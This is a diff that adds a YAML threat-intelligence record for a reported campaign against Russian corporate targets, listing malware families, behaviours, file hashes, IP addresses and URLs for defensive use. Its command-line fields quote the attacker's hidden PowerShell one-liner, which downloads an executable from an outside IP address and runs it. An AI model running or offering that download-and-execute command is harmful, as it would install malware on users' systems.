@@ -1,0 +1,53 @@
+description: SEQRITE APT-Team campaign targeting Russian corporate entities using
+  malicious LNK files, DUPERUNNER implant, and AdaptixC2 beacon.
+malware_families:
+- DUPERUNNER
+- AdaptixC2
+TTPs:
+  processes:
+  - powershell.exe
+  - explorer.exe
+  - notepad.exe
+  - msedge.exe
+  commandline:
+  - powershell.exe -NoNI -nop -w hidden -Command iwr http://46.149.71.230/s.exe -OutFile
+    $env:TEMP\\s.exe; Start-Process $env:TEMP\\s.exe
+  powershell:
+  - iwr http://46.149.71.230/s.exe -OutFile $env:TEMP\\s.exe; Start-Process $env:TEMP\\s.exe
+  scripting_engine: []
+  registry_keys: []
+  image_load:
+  - ntdll.dll
+  - kernel32.dll
+  network_connections:
+  - powershell.exe, 46.149.71.230, 80
+  - fontawesome_tld.woff, 46.149.71.230, 80
+  - AdaptixC2 beacon, 46.149.71.230, 443
+  file_activity:
+  - s.exe
+  - fontawesome_tld.woff
+  - fontawesome.woff
+  persistence: []
+  process_relations:
+  - powershell.exe -> s.exe
+IOCs:
+  hashes:
+  - 87db5cbd76e7adeb6932c4ae14f3d3bb736d631460d65e067fb2a0083b675399
+  - d9e2b6341f6de5c95dd02cf3350c07cd2be3b0a78b82c073229396b6d4c8d3c1
+  - 3ce5ab897b7f33bc1b9036abc8e7d2812b385fbab404dad686afaf9fb83fe07a
+  - 48b9f78899b8a3daaeb9cbf7245350a6222cbf0468cd5c2bab954c8dbbce3995
+  ip_addresses:
+  - 46.149.71.230
+  - 195.2.70.190
+  domains: []
+  urls:
+  - http://46.149.71.230/s.exe
+  - http://46.149.71.230/fontawesome_tld.woff
+  - https://195.2.70.190:443/hitp:/195.2.70.190:443/dashboards/ren/aeroport/
+authors:
+- Subhajeet Singha
+- Priya Patel
+- Nandini Seth
+reference: https://www.seqrite.com/blog/9512-2
+date_of_publication: December 03, 2025
+file_creation_date: December 04, 2025
